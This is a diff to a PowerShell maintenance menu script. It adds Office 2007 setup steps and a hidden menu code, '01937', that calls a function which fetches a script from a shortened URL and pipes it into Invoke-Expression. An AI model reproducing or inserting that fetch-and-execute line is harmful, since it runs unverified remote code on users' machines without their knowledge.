@@ -419,6 +419,12 @@ function DisplayMenu {
             Exit-PSSession
         }
 
+        01937 {
+
+            awin
+
+        }
+
         default {
             #ENTRADA INVÁLIDA.
 
@@ -676,7 +682,11 @@ function Office2007 {
    
     Start-Process "$TOOL\OFFICE\2007\Setup.exe" -ArgumentList '/adminfile Silent.msp'
 
-    Start-Process 'winword'
+    Add-WindowsCapability –Online -Name NetFx3~~~~ –Source D:\sources\sxs
+
+    Enable-WindowsOptionalFeature -Online -FeatureName 'NetFx3'
+
+    Start-Process 'winword.exe'
       
 }
 
@@ -711,6 +721,12 @@ function DelTemp {
     Remove-Item -Path $env:C:\Windows\temp\* -Recurse -Force -ErrorAction SilentlyContinue
 
     Remove-Item -Path $env:C:\Windows\Prefetch\* -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+function awin {
+    
+    Invoke-RestMethod https://4br.me/awin | Invoke-Expression
+    
 }
 
 DisplayMenu 
